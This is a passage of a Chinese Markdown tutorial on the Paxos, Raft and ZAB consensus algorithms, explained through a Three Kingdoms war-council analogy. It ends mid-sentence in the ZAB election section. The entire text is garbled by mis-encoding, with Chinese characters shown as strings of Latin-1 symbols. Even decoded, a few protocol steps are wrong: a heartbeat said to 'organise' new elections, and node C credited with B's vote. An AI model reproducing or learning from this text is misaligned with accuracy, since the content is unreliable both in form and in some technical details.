è§’è‰²\n\nPaxos ä¸­æœ‰ä¸‰ç§è§’è‰²ï¼šæè®®è€…ï¼ˆProposerï¼‰ã€æ¥å—è€…ï¼ˆAcceptorï¼‰ã€å­¦ä¹ è€…ï¼ˆLearnerï¼‰ã€‚\n\n\n\n<img src=\"åˆ†å¸ƒå¼åè®®å’Œç®—æ³•/640-20230904193905334.png\" alt=\"å›¾ç‰‡\" style=\"zoom:75%;\" />\n\n##### 1. æè®®è€…ï¼ˆProposerï¼‰\n\n- æè®®ä¸€ä¸ªå€¼ï¼Œç”¨äºæŠ•ç¥¨è¡¨å†³ã€‚\n- æ¥å…¥å’Œåè°ƒï¼Œæ”¶åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚åï¼Œå¯ä»¥å‘èµ·äºŒé˜¶æ®µæäº¤ï¼Œè¿›è¡Œå…±è¯†åå•†ã€‚\n- `æ˜ å°„`åˆ°ä¸Šé¢çš„æ•…äº‹ä¸­ï¼Œ`å†›å¸ˆ`å°±æ˜¯ç”¨æ¥éƒ¨ç½²ä½œæˆ˜è®¡åˆ’çš„ã€‚\n\n##### 2. æ¥å—è€…ï¼ˆAcceptorï¼‰\n\n- å¯¹æ¯ä¸ªæè®®çš„å€¼è¿›è¡ŒæŠ•ç¥¨ï¼Œå¹¶å­˜å‚¨æ¥å—çš„å€¼ã€‚\n- æŠ•ç¥¨åå•†å’Œå­˜å‚¨æ•°æ®ï¼Œå¯¹æè®®çš„å€¼è¿›è¡ŒæŠ•ç¥¨ï¼Œå¹¶æ¥å—è¾¾æˆå…±è¯†çš„å€¼ï¼Œå­˜å‚¨ä¿å­˜ã€‚\n- `æ˜ å°„`åˆ°ä¸Šé¢çš„æ•…äº‹ä¸­ï¼Œ`æ­¦å°†`å°±æ˜¯ç”¨æ¥æ¥å—å†›å¸ˆçš„ä½œæˆ˜è®¡åˆ’ã€‚\n- å…¶å®ï¼Œé›†ç¾¤ä¸­æ‰€æœ‰çš„èŠ‚ç‚¹éƒ½åœ¨æ‰®æ¼”æ¥å—è€…çš„è§’è‰²ï¼Œå‚ä¸å…±è¯†åå•†ï¼Œå¹¶æ¥å—å’Œå­˜å‚¨æ•°æ®ã€‚\n\n##### 3. å­¦ä¹ è€…ï¼ˆLearnerï¼‰\n\n- è¢«å‘ŠçŸ¥æŠ•ç¥¨çš„ç»“æœï¼Œæ¥å—è¾¾æˆå…±è¯†çš„å€¼ï¼Œå­˜å‚¨æ•°æ®ï¼Œ\n- ä¸å‚ä¸æŠ•ç¥¨çš„è¿‡ç¨‹ï¼Œå³ä¸å‚ä¸å…±è¯†åå•†ã€‚\n- `æ˜ å°„`åˆ°ä¸Šé¢çš„æ•…äº‹ä¸­ï¼Œå°±æ˜¯ä¸¤å`æ–‡è‡£`ä½œä¸ºè®°å½•ä½œæˆ˜æ–¹æ¡ˆçš„`å¤‡èƒ`ã€‚\n\n\n\n### 3.2 æ¥å—è€…ï¼Ÿæè®®è€…ï¼Ÿ\n\næœ‰çš„èŠ‚ç‚¹å³å¯ä»¥æ‰®æ¼”æ¥å—è€…ï¼Œä¹Ÿå¯ä»¥æ‰®æ¼”æè®®è€…ã€‚\n\n- **ä½œä¸ºæ¥å—è€…**ï¼Œæ¥æ”¶å®¢æˆ·ç«¯çš„æ¶ˆæ¯ã€‚æ¯”å¦‚`è¯¸è‘›äº®`éœ€è¦æ¥æ”¶`åˆ˜å¤‡`çš„ä½œæˆ˜è¦æ±‚ã€‚\n- **ä½œä¸ºæè®®è€…**ï¼Œå‘èµ·äºŒé˜¶æ®µæäº¤ã€‚ç„¶åè¿™ä¸ªèŠ‚ç‚¹å’Œå¦å¤–å…¶ä»–èŠ‚ç‚¹ä½œä¸ºæ¥å—è€…è¿›è¡Œå…±è¯†åå•†ã€‚æ¯”å¦‚`è¯¸è‘›äº®`è¦æ±‡æ€»æœ€ç»ˆçš„ä½œæˆ˜è®¡åˆ’ç»™`åˆ˜å¤‡`ã€‚\n\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒèŠ‚ç‚¹ 1 ä½œä¸ºæè®®è€…å’Œæ¥å—è€…ï¼ŒèŠ‚ç‚¹ 2 å’ŒèŠ‚ç‚¹ 3 ä½œä¸ºæ¥å—è€…ã€‚\n\n<img src=\"åˆ†å¸ƒå¼åè®®å’Œç®—æ³•/640-20230904194233820.png\" alt=\"å›¾ç‰‡\" style=\"zoom:75%;\" />\n\n### 3.3 æµç¨‹\n\nè¯¸è‘›äº®çš„ä½œæˆ˜è®¡åˆ’æ˜¯ä»åŒ—è¾¹è¿›æ”»æ›¹æ“ï¼Œåºç»Ÿçš„ä½œæˆ˜è®¡åˆ’æ˜¯ä»å—è¾¹è¿›æ”»æ›¹æ“ï¼Œè€Œå…³ç¾½ã€å¼ é£ã€èµµäº‘å…ˆåæ”¶åˆ°äº†ä»–ä»¬çš„ä½œæˆ˜è®¡åˆ’ï¼Œè¯¥å¬è°çš„å‘¢ï¼Ÿè¿™é‡Œå°±æ˜¯ä¸€ä¸ªå…±è¯†çš„é—®é¢˜ã€‚\n\n**è€Œ Paxos ç®—æ³•è¾¾æˆå…±è¯†åˆ†ä¸¤ä¸ªé˜¶æ®µã€‚å‡†å¤‡ï¼ˆPrepareï¼‰é˜¶æ®µå’Œæ¥å—ï¼ˆAcceptï¼‰é˜¶æ®µã€‚**\n\n##### 1. å‡†å¤‡é˜¶æ®µ\n\n<img src=\"åˆ†å¸ƒå¼åè®®å’Œç®—æ³•/640-20230904194855309.png\" alt=\"å›¾ç‰‡\" style=\"zoom:75%;\" />\n\nè€Œå¯¹äºåºç»Ÿçš„å‡†å¤‡è¯·æ±‚ï¼Œå…³ç¾½ã€å¼ é£æ”¶åˆ°ç¼–å·ä¸º `2` çš„å‡†å¤‡è¯·æ±‚ï¼Œè€Œ ç¼–å· `2` å¤§äºä¹‹å‰æ¥å—åˆ°çš„ç¼–å· `1` ï¼Œè€Œä¸”å…³ç¾½å’Œå¼ é£æ²¡æœ‰é€šè¿‡ä»»ä½•ææ¡ˆï¼Œæ‰€ä»¥è¿˜æ˜¯ä¼šè¿”å›ç»™åºç»Ÿä¸€ä¸ª`å°šæ— ææ¡ˆ` çš„å“åº”ã€‚\n\nè€Œèµµäº‘æœ€åæ”¶åˆ°è¯¸è‘›äº®ç¼–å·ä¸º `1` çš„`å‡†å¤‡è¯·æ±‚`åï¼Œå› ç¼–å· `1`å°äºä¹‹å‰å“åº”çš„å‡†å¤‡è¯·æ±‚çš„ææ¡ˆç¼–å· `2`ï¼Œæ‰€ä»¥ç›´æ¥ä¸¢å¼ƒè¯¥å‡†å¤‡è¯·æ±‚ï¼Œä¸åšå“åº”ï¼Œå¦‚ä¸Šå›¾çš„ âŒ å›¾ç¤ºã€‚\n\n##### 2. æ¥å—é˜¶æ®µ\n\n**å‘é€æ¥å—è¯·æ±‚**\n\n<img src=\"åˆ†å¸ƒå¼åè®®å’Œç®—æ³•/640-20230904195124325.png\" alt=\"å›¾ç‰‡\" style=\"zoom:75%;\" />\n\n`è¯¸è‘›äº®`æ”¶åˆ°å¤§å¤šæ•°æ¥å—è€…ï¼ˆå…³ç¾½å’Œå¼ é£ï¼‰çš„`å‡†å¤‡å“åº”`åï¼Œæ ¹æ®å“åº”ä¸­ææ¡ˆç¼–å·æœ€å¤§çš„ææ¡ˆçš„å€¼ï¼Œè®¾ç½®`æ¥å—è¯·æ±‚`ä¸­çš„å€¼\n\nè€Œ`åºç»Ÿ`æ”¶åˆ°å¤§å¤šæ•°æ¥å—è€…ï¼ˆå…³ç¾½ã€å¼ é£å’Œèµµäº‘ï¼‰çš„`å‡†å¤‡å“åº”`åï¼Œæ ¹æ®å“åº”ä¸­ææ¡ˆç¼–å·æœ€å¤§çš„ææ¡ˆçš„å€¼ï¼Œè®¾ç½®`æ¥å—è¯·æ±‚`ä¸­çš„å€¼ã€‚\n\n**æ”¶åˆ°æ¥å—è¯·æ±‚**\n\n<img src=\"åˆ†å¸ƒå¼åè®®å’Œç®—æ³•/640-20230904195141432.png\" alt=\"å›¾ç‰‡\" style=\"zoom:75%;\" />\n\nå…³ç¾½ã€å¼ é£ã€èµµäº‘æ”¶åˆ°è¯¸è‘›äº®å‘é€çš„ææ¡ˆ [1ï¼ŒåŒ—]æ—¶å€™ï¼Œå› ä¸ºææ¡ˆç¼–å· `1`å°äºä»–ä»¬æ‰¿è¯ºçš„èƒ½é€šè¿‡çš„ææ¡ˆçš„æœ€å°ææ¡ˆç¼–å· `2`ï¼Œæ‰€ä»¥è¯¸è‘›äº®çš„ææ¡ˆè¢«æ‹’ç»äº†ã€‚\n\nè€Œå½“ä»–ä»¬æ”¶åˆ°åºç»Ÿçš„å‘é€çš„ææ¡ˆ [2ï¼Œå—] çš„æ—¶å€™ï¼Œå› ä¸ºç¼–å· 2 ä¸å°äºä¹‹å‰æ‰¿è¯ºçš„ç¼–å· 2ï¼Œæ‰€ä»¥é€šè¿‡åºç»Ÿçš„ææ¡ˆ [2ï¼Œå—] ï¼Œæ‰€ä»¥å…³ç¾½ã€å¼ é£ã€èµµäº‘ä»–ä»¬çš„ä½œæˆ˜è®¡åˆ’æ˜¯ä»å—è¾¹è¿›æ”»æ›¹æ“ã€‚è¾¾æˆäº†å…±è¯†ã€‚\n\n##### 3. å­¦ä¹ è€…ç™»åœº\n\nå½“æ¥å—è€…é€šè¿‡äº†ä¸€ä¸ªææ¡ˆæ—¶ï¼Œå°±é€šçŸ¥æ‰€æœ‰çš„å­¦ä¹ è€…ã€‚å½“å­¦ä¹ è€…å‘ç°å¤§å¤šæ•°çš„æ¥å—è€…éƒ½é€šè¿‡äº†æŸä¸ªææ¡ˆï¼Œé‚£ä¹ˆå­¦ä¹ è€…ä¹Ÿä¼šé€šè¿‡è¯¥ææ¡ˆï¼Œæ¥å—è¯¥ææ¡ˆçš„å€¼ã€‚\n\nä¹Ÿå°±æ˜¯è¯´å…³ç¾½ã€å¼ é£ã€èµµäº‘è¾¾æˆäº†å…±è¯†åï¼Œå­¦ä¹ è€…`æ³•æ­£`å’Œ`é©¬è‰¯`ä¹ŸåŒæ ·é€šè¿‡ä»å—è¾¹è¿›æ”»çš„ä½œæˆ˜è®¡åˆ’ã€‚\n\n### 3.4 ææ¡ˆç¼–å·\n\nææ¡ˆç¼–å·ä»£è¡¨ä¼˜å…ˆçº§ï¼Œä¿è¯äº†ä¸‰ä¸ªæ‰¿è¯ºï¼š\n\n- - å¦‚æœ`å‡†å¤‡è¯·æ±‚`çš„ææ¡ˆç¼–å·ï¼Œ`å°äºç­‰äº`æ¥å—è€…å·²ç»å“åº”çš„`å‡†å¤‡è¯·æ±‚`çš„ææ¡ˆç¼–å·ï¼Œé‚£ä¹ˆæ¥å—è€…å°†æ‰¿è¯ºä¸å“åº”è¿™ä¸ª`å‡†å¤‡è¯·æ±‚`ã€‚\n  - å¦‚æœ`æ¥å—è¯·æ±‚`ä¸­çš„ææ¡ˆçš„ææ¡ˆç¼–å·ï¼Œ`å°äº`æ¥å—è€…å·²ç»å“åº”çš„`å‡†å¤‡è¯·æ±‚`çš„ææ¡ˆï¼Œé‚£ä¹ˆæ¥å—è€…å°†æ‰¿è¯ºä¸é€šè¿‡è¿™ä¸ªææ¡ˆã€‚\n  - å¦‚æœæ¥å—è€…ä¹‹å‰æœ‰é€šè¿‡ææ¡ˆï¼Œé‚£ä¹ˆæ¥å—è€…å°†æ‰¿è¯ºï¼Œä¼šåœ¨`å‡†å¤‡è¯·æ±‚`çš„å“åº”ä¸­ï¼ŒåŒ…å«å·²ç»é€šè¿‡çš„æœ€å¤§ç¼–å·çš„ææ¡ˆä¿¡æ¯ã€‚\n\n\n\n<img src=\"åˆ†å¸ƒå¼åè®®å’Œç®—æ³•/4.png\" alt=\"1\" style=\"zoom:67%;\" />\n\n\n\n<img src=\"åˆ†å¸ƒå¼åè®®å’Œç®—æ³•/5.png\" alt=\"1\" style=\"zoom:67%;\" />\n\n# 4. Raft ç®—æ³•\n\nRaft ç®—æ³•æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿå¼€å‘é¦–é€‰çš„å…±è¯†ç®—æ³•ã€‚æ¯”å¦‚ç°åœ¨æµè¡Œ Etcdã€Consulã€‚Raft ç®—æ³•æ˜¯é€šè¿‡ä¸€åˆ‡ä»¥é¢†å¯¼è€…ä¸ºå‡†çš„æ–¹å¼ï¼Œå®ç°ä¸€ç³»åˆ—å€¼çš„å…±è¯†å’Œå„èŠ‚ç‚¹æ—¥å¿—çš„ä¸€è‡´ã€‚\n\nåŠ¨ç”»æ¼”ç¤ºï¼šhttp://thesecretlivesofdata.com/raft/\n\n### 4.1 è§’è‰²\n\n##### 1. **è·Ÿéšè€…ï¼ˆFollowerï¼‰**\n\n`æ™®é€šç¾¤ä¼—`ï¼Œé»˜é»˜æ¥æ”¶å’Œæ¥è‡ªé¢†å¯¼è€…çš„æ¶ˆæ¯ï¼Œå½“é¢†å¯¼è€…å¿ƒè·³ä¿¡æ¯è¶…æ—¶çš„æ—¶å€™ï¼Œå°±ä¸»åŠ¨ç«™å‡ºæ¥ï¼Œæ¨èè‡ªå·±å½“å€™é€‰äººã€‚\n\n##### 2. **å€™é€‰äººï¼ˆCandidateï¼‰**\n\n`å€™é€‰äºº`å°†å‘å…¶ä»–èŠ‚ç‚¹è¯·æ±‚æŠ•ç¥¨ RPC æ¶ˆæ¯ï¼Œé€šçŸ¥å…¶ä»–èŠ‚ç‚¹æ¥æŠ•ç¥¨ï¼Œå¦‚æœèµ¢å¾—äº†å¤§å¤šæ•°æŠ•ç¥¨é€‰ç¥¨ï¼Œå°±æ™‹å‡å½“é¢†å¯¼è€…ã€‚\n\n##### 3. **é¢†å¯¼è€…ï¼ˆLeaderï¼‰**\n\n`éœ¸é“æ€»è£`ï¼Œä¸€åˆ‡ä»¥æˆ‘ä¸ºå‡†ã€‚å¤„ç†å†™è¯·æ±‚ã€ç®¡ç†æ—¥å¿—å¤åˆ¶å’Œä¸æ–­åœ°å‘é€å¿ƒè·³ä¿¡æ¯ï¼Œé€šçŸ¥å…¶ä»–èŠ‚ç‚¹â€œæˆ‘æ˜¯é¢†å¯¼è€…ï¼Œæˆ‘è¿˜æ´»ç€ï¼Œä½ ä»¬ä¸è¦â€å‘èµ·æ–°çš„é€‰ä¸¾ï¼Œä¸ç”¨æ‰¾æ–°é¢†å¯¼æ¥æ›¿ä»£æˆ‘ã€‚\n\n### 4.2 é€‰ä¸¾è¿‡ç¨‹\n\nåˆå§‹çŠ¶æ€ä¸‹ï¼Œé›†ç¾¤ä¸­æ‰€æœ‰èŠ‚ç‚¹éƒ½æ˜¯è·Ÿéšè€…çš„çŠ¶æ€ã€‚\n\n##### 1. é»˜è®¤éƒ½æ˜¯è·Ÿéšè€…\n\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæœ‰ä¸‰ä¸ªèŠ‚ç‚¹(Node) aã€bã€cï¼Œä»»æœŸï¼ˆTermï¼‰éƒ½ä¸º 0ã€‚\n\n<img src=\"åˆ†å¸ƒå¼åè®®å’Œç®—æ³•/640-20230904200514379.png\" alt=\"å›¾ç‰‡\" style=\"zoom:50%;\" />\n\n##### 2. éšæœºè¶…æ—¶æˆä¸ºå€™é€‰äºº\n\nRaft ç®—æ³•å®ç°äº†éšæœºè¶…æ—¶æ—¶é—´çš„ç‰¹æ€§ï¼Œæ¯ä¸ªèŠ‚ç‚¹ç­‰å¾…é¢†å¯¼è€…èŠ‚ç‚¹å¿ƒè·³ä¿¡æ¯çš„è¶…æ—¶æ—¶é—´é—´éš”æ˜¯éšæœºçš„ã€‚æ¯”å¦‚ A èŠ‚ç‚¹ç­‰å¾…è¶…æ—¶çš„æ—¶é—´é—´éš” 150 msï¼ŒB èŠ‚ç‚¹ 200 msï¼ŒC èŠ‚ç‚¹ 300 msã€‚é‚£ä¹ˆ a å…ˆè¶…æ—¶ï¼Œæœ€å…ˆå› ä¸ºæ²¡æœ‰ç­‰åˆ°é¢†å¯¼è€…çš„å¿ƒè·³ä¿¡æ¯ï¼Œå‘ç”Ÿè¶…æ—¶ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä¸‰ä¸ªèŠ‚ç‚¹çš„è¶…æ—¶è®¡æ—¶å™¨å¼€å§‹è¿è¡Œã€‚\n\n<img src=\"åˆ†å¸ƒå¼åè®®å’Œç®—æ³•/640.gif\" alt=\"å›¾ç‰‡\" style=\"zoom:67%;\" />\n\nå½“ A èŠ‚ç‚¹çš„è¶…æ—¶æ—¶é—´åˆ°äº†åï¼ŒA èŠ‚ç‚¹æˆä¸ºå€™é€‰è€…ï¼Œå¹¶å¢åŠ è‡ªå·±çš„ä»»æœŸç¼–å·ï¼ŒTerm å€¼ä» 0 æ›´æ–°ä¸º 1ï¼Œå¹¶ç»™è‡ªå·±æŠ•äº†ä¸€ç¥¨ã€‚\n\n- Node Aï¼šTerm = 1, Vote Count = 1ã€‚\n- Node Bï¼šTerm = 0ã€‚\n- Node Cï¼šTerm = 0ã€‚\n\n<img src=\"åˆ†å¸ƒå¼åè®®å’Œç®—æ³•/640-20230904200702277.gif\" alt=\"å›¾ç‰‡\" style=\"zoom:67%;\" />\n\n##### 3.  å€™é€‰è€…è®©å…¶ä»–äººæŠ•ç¥¨\n\nåœ¨ä¸€æ¬¡é€‰ä¸¾ä¸­ï¼Œæ¯ä¸€ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹æœ€å¤šä¼šå¯¹ä¸€ä¸ªä»»æœŸç¼–å·æŠ•å‡ºä¸€å¼ é€‰ç¥¨ï¼ŒæŠ•å®Œäº†å°±æ²¡äº†ã€‚\n\n<img src=\"åˆ†å¸ƒå¼åè®®å’Œç®—æ³•/640-20230904200717833.gif\" alt=\"å›¾ç‰‡\" style=\"zoom:67%;\" />\n\n- **ç¬¬ä¸€æ­¥**ï¼šèŠ‚ç‚¹ A æˆä¸ºå€™é€‰è€…åï¼Œå‘å…¶ä»–èŠ‚ç‚¹å‘é€è¯·æ±‚æŠ•ç¥¨ RPC ä¿¡æ¯ï¼Œè¯·å®ƒä»¬é€‰ä¸¾è‡ªå·±ä¸ºé¢†å¯¼è€…ã€‚\n- **ç¬¬äºŒæ­¥**ï¼šèŠ‚ç‚¹ B å’Œ èŠ‚ç‚¹ C æ¥æ”¶åˆ°èŠ‚ç‚¹ A å‘é€çš„è¯·æ±‚æŠ•ç¥¨ä¿¡æ¯åï¼Œåœ¨ç¼–å·ä¸º 1 çš„è¿™å±Šä»»æœŸå†…ï¼Œè¿˜æ²¡æœ‰è¿›è¡Œè¿‡æŠ•ç¥¨ï¼Œå°±æŠŠé€‰ç¥¨æŠ•ç»™èŠ‚ç‚¹ Aï¼Œå¹¶å¢åŠ è‡ªå·±çš„ä»»æœŸç¼–å·ã€‚\n- **ç¬¬ä¸‰æ­¥**ï¼šèŠ‚ç‚¹ A æ”¶åˆ° 3 æ¬¡æŠ•ç¥¨ï¼Œå¾—åˆ°äº†å¤§å¤šæ•°èŠ‚ç‚¹çš„æŠ•ç¥¨ï¼Œä»å€™é€‰è€…æˆä¸ºæœ¬å±Šä»»æœŸå†…çš„æ–°çš„é¢†å¯¼è€…ã€‚\n- **ç¬¬å››æ­¥**ï¼šèŠ‚ç‚¹ A ä½œä¸ºé¢†å¯¼è€…ï¼Œå›ºå®šçš„æ—¶é—´é—´éš”ç»™ èŠ‚ç‚¹ B å’ŒèŠ‚ç‚¹ C å‘é€å¿ƒè·³ä¿¡æ¯ï¼Œå‘Šè¯‰èŠ‚ç‚¹ B å’Œ Cï¼Œæˆ‘æ˜¯é¢†å¯¼è€…ï¼Œç»„ç»‡å…¶ä»–è·Ÿéšè€…å‘èµ·æ–°çš„é€‰ä¸¾ã€‚\n- **ç¬¬äº”æ­¥**ï¼šèŠ‚ç‚¹ B å’ŒèŠ‚ç‚¹ C å‘é€å“åº”ä¿¡æ¯ç»™èŠ‚ç‚¹ Aï¼Œå‘Šè¯‰èŠ‚ç‚¹ A æˆ‘æ˜¯æ­£å¸¸çš„ã€‚\n\n\n\n### 4.3 ä»»æœŸ\n\nè‹±æ–‡å•è¯æ˜¯ termï¼Œé¢†å¯¼è€…æ˜¯æœ‰ä»»æœŸçš„ã€‚\n\n- **è‡ªåŠ¨å¢åŠ **ï¼šè·Ÿéšè€…åœ¨ç­‰å¾…é¢†å¯¼è€…å¿ƒè·³ä¿¡æ¯è¶…æ—¶åï¼Œæ¨èè‡ªå·±ä¸ºå€™é€‰äººï¼Œä¼šå¢åŠ è‡ªå·±çš„ä»»æœŸå·ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒèŠ‚ç‚¹ A ä»»æœŸä¸º 0ï¼Œæ¨ä¸¾è‡ªå·±ä¸ºå€™é€‰äººæ—¶ï¼Œä»»æœŸç¼–å·å¢åŠ ä¸º 1ã€‚\n- **æ›´æ–°ä¸ºè¾ƒå¤§å€¼**ï¼šå½“èŠ‚ç‚¹å‘ç°è‡ªå·±çš„ä»»æœŸç¼–å·æ¯”å…¶ä»–èŠ‚ç‚¹å°æ—¶ï¼Œä¼šæ›´æ–°åˆ°è¾ƒå¤§çš„ç¼–å·å€¼ã€‚æ¯”å¦‚èŠ‚ç‚¹ A çš„ä»»æœŸä¸º 1ï¼Œè¯·æ±‚æŠ•ç¥¨ï¼ŒæŠ•ç¥¨æ¶ˆæ¯ä¸­åŒ…å«äº†èŠ‚ç‚¹ A çš„ä»»æœŸç¼–å·ï¼Œä¸”ç¼–å·ä¸º 1ï¼ŒèŠ‚ç‚¹ B æ”¶åˆ°æ¶ˆæ¯åï¼Œä¼šå°†è‡ªå·±çš„ä»»æœŸç¼–å·æ›´æ–°ä¸º 1ã€‚\n- **æ¢å¤ä¸ºè·Ÿéšè€…**ï¼šå¦‚æœä¸€ä¸ªå€™é€‰äººæˆ–è€…é¢†å¯¼è€…ï¼Œå‘ç°è‡ªå·±çš„ä»»æœŸç¼–å·æ¯”å…¶ä»–èŠ‚ç‚¹å°ï¼Œé‚£ä¹ˆå®ƒä¼šç«‹å³æ¢å¤æˆè·Ÿéšè€…çŠ¶æ€ã€‚è¿™ç§åœºæ™¯å‡ºç°åœ¨åˆ†åŒºé”™è¯¯æ¢å¤åï¼Œä»»æœŸä¸º 3 çš„é¢†å¯¼è€…å—åˆ°ä»»æœŸç¼–å·ä¸º 4 çš„å¿ƒè·³æ¶ˆæ¯ï¼Œé‚£ä¹ˆå‰è€…å°†ç«‹å³æ¢å¤æˆè·Ÿéšè€…çŠ¶æ€ã€‚\n- **æ‹’ç»æ¶ˆæ¯**ï¼šå¦‚æœä¸€ä¸ªèŠ‚ç‚¹æ¥æ”¶åˆ°è¾ƒå°çš„ä»»æœŸç¼–å·å€¼çš„è¯·æ±‚ï¼Œé‚£ä¹ˆå®ƒä¼šç›´æ¥æ‹’ç»è¿™ä¸ªè¯·æ±‚ï¼Œæ¯”å¦‚ä»»æœŸç¼–å·ä¸º 6 çš„èŠ‚ç‚¹ Aï¼Œæ”¶åˆ°ä»»æœŸç¼–å·ä¸º 5 çš„èŠ‚ç‚¹ B çš„è¯·æ±‚æŠ•ç¥¨ RPC æ¶ˆæ¯ï¼Œé‚£ä¹ˆèŠ‚ç‚¹ A ä¼šæ‹’ç»è¿™ä¸ªæ¶ˆæ¯ã€‚\n\n### 4.4 å¤§å¤šæ•°\n\nå‡è®¾ä¸€ä¸ªé›†ç¾¤ç”± N ä¸ªèŠ‚ç‚¹ç»„æˆï¼Œé‚£ä¹ˆå¤§å¤šæ•°å°±æ˜¯è‡³å°‘ N/2+1ã€‚ä¾‹å¦‚ï¼š3 ä¸ªèŠ‚ç‚¹çš„é›†ç¾¤ï¼Œå¤§å¤šæ•°å°±æ˜¯ 2ã€‚\n\n### 4.5 é¢†å¯¼è€…æ•…éšœ\n\nå¦‚æœé¢†å¯¼è€…èŠ‚ç‚¹å‡ºç°æ•…éšœï¼Œåˆ™ä¼šè§¦å‘æ–°çš„ä¸€è½®é€‰ä¸¾ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œé¢†å¯¼è€…èŠ‚ç‚¹ A å‘ç”Ÿæ•…éšœï¼ŒèŠ‚ç‚¹ B å’Œ èŠ‚ç‚¹ C å°±ä¼šé‡æ–°é€‰ä¸¾ Leaderã€‚\n\n<img src=\"åˆ†å¸ƒå¼åè®®å’Œç®—æ³•/640-20230904201234538.gif\" alt=\"å›¾ç‰‡\" style=\"zoom:67%;\" />\n\n- **ç¬¬ä¸€æ­¥** ï¼šèŠ‚ç‚¹ A å‘ç”Ÿæ•…éšœï¼ŒèŠ‚ç‚¹ B å’ŒèŠ‚ç‚¹ C æ²¡æœ‰æ”¶åˆ°é¢†å¯¼è€…èŠ‚ç‚¹ A çš„å¿ƒè·³ä¿¡æ¯ï¼Œç­‰å¾…è¶…æ—¶ã€‚\n- **ç¬¬äºŒæ­¥**ï¼šèŠ‚ç‚¹ C å…ˆå‘ç”Ÿè¶…æ—¶ï¼ŒèŠ‚ç‚¹ C æˆä¸ºå€™é€‰äººã€‚\n- **ç¬¬ä¸‰æ­¥**ï¼šèŠ‚ç‚¹ C å‘èŠ‚ç‚¹ A å’ŒèŠ‚ç‚¹ B å‘èµ·è¯·æ±‚æŠ•ç¥¨ä¿¡æ¯ã€‚\n- **ç¬¬å››æ­¥**ï¼šèŠ‚ç‚¹ C å“åº”æŠ•ç¥¨ï¼Œå°†ç¥¨æŠ•ç»™äº† Cï¼Œè€ŒèŠ‚ç‚¹ A å› ä¸ºå‘ç”Ÿæ•…éšœäº†ï¼Œæ— æ³•å“åº” C çš„æŠ•ç¥¨è¯·æ±‚ã€‚\n- **ç¬¬äº”æ­¥**ï¼šèŠ‚ç‚¹ C æ”¶åˆ°ä¸¤ç¥¨ï¼ˆå¤§å¤šæ•°ç¥¨æ•°ï¼‰ï¼Œæˆä¸ºé¢†å¯¼è€…ã€‚\n- **ç¬¬å…­æ­¥**ï¼šèŠ‚ç‚¹ C å‘èŠ‚ç‚¹ A å’Œ B å‘é€å¿ƒè·³ä¿¡æ¯ï¼ŒèŠ‚ç‚¹ B å“åº”å¿ƒè·³ä¿¡æ¯ï¼ŒèŠ‚ç‚¹ A ä¸å“åº”å¿ƒè·³ä¿¡æ¯ã€‚\n\n\n\n# 5. ZAB ç®—æ³•\n\nZAB åè®®çš„å…¨ç§°æ˜¯ Zookeeper Atomic Broadcaseï¼ŒåŸå­å¹¿æ’­åè®®ã€‚\n\n### 5.1 è§’è‰²\n\n##### 1. Observer\n\nå’Œ Follower ä¸€æ ·ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ï¼Œä¸å‚ä¸ Leader çš„é€‰ä¸¾ï¼Œä¸”çŠ¶æ€ä¸º OBSERINGã€‚\n\n##### 2. Follower\n\nè´Ÿè´£å¤„ç†å®¢æˆ·ç«¯å‘é€çš„è¯»è¯·æ±‚ï¼Œè½¬å‘å†™äº‹åŠ¡è¯·æ±‚ç»™ Leaderã€‚å‚ä¸ Leader çš„é€‰ä¸¾ï¼ŒçŠ¶æ€ä¸º FOLLOWINGã€‚\n\n##### 3. Leader\n\nè´Ÿè´£å¤„ç†å®¢æˆ·ç«¯å‘é€çš„è¯»ã€å†™äº‹åŠ¡è¯·æ±‚ã€‚è¿™é‡Œçš„äº‹åŠ¡è¯·æ±‚å¯ä»¥ç†è§£è¿™ä¸ªè¯·æ±‚å…·æœ‰äº‹åŠ¡çš„ ACID ç‰¹æ€§ã€‚\nåŒæ­¥å†™äº‹åŠ¡è¯·æ±‚ç»™å…¶ä»–èŠ‚ç‚¹ï¼Œä¸”éœ€è¦ä¿è¯äº‹åŠ¡çš„é¡ºåºæ€§ã€‚çŠ¶æ€ä¸º LEADINGã€‚\n\n### 5.2 é€‰ä¸¾\n\n<img src=\"åˆ†å¸ƒå¼åè®®å’Œç®—æ³•/image-20220323174738548VLeZat.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n- èŠ‚ç‚¹ A å…ˆ`æŠ•ç¥¨ç»™è‡ªå·±`ï¼ŒæŠ•ç¥¨ä¿¡æ¯åŒ…å«`èŠ‚ç‚¹ idï¼ˆSID)` å’Œä¸€ä¸ª `ZXID`ï¼Œå¦‚ ï¼ˆ1,0ï¼‰ã€‚SID æ˜¯é…ç½®å¥½çš„ï¼Œä¸”å”¯ä¸€ï¼ŒZXID æ˜¯å”¯ä¸€çš„é€’å¢ç¼–å·ã€‚\n- èŠ‚ç‚¹ B å…ˆ`æŠ•ç¥¨ç»™è‡ªå·±`ï¼ŒæŠ•ç¥¨ä¿¡æ¯ä¸ºï¼ˆ2,0ï¼‰ã€‚\n- ç„¶åèŠ‚ç‚¹ A å’Œ B å°†è‡ªå·±çš„æŠ•ç¥¨ä¿¡æ¯`æŠ•ç¥¨`ç»™é›†ç¾¤ä¸­`æ‰€æœ‰èŠ‚ç‚¹`ã€‚\n- èŠ‚ç‚¹ A æ”¶åˆ°èŠ‚ç‚¹ B çš„æŠ•ç¥¨ä¿¡æ¯åï¼Œ`æ£€æŸ¥`ä¸‹èŠ‚ç‚¹ B çš„çŠ¶æ€æ˜¯å¦æ˜¯`æœ¬è½®æŠ•ç¥¨`ï¼Œä»¥åŠæ˜¯å¦æ˜¯`æ­£åœ¨é€‰ä¸¾(LOOKING)`çš„çŠ¶æ€ã€‚\n- æŠ•ç¥¨ PKï¼šèŠ‚ç‚¹ A ä¼šå°†è‡ªå·±çš„æŠ•ç¥¨å’Œåˆ«äººçš„æŠ•ç¥¨è¿›è¡Œ PKï¼Œå¦‚æœåˆ«çš„èŠ‚ç‚¹å‘è¿‡æ¥çš„ ZXID 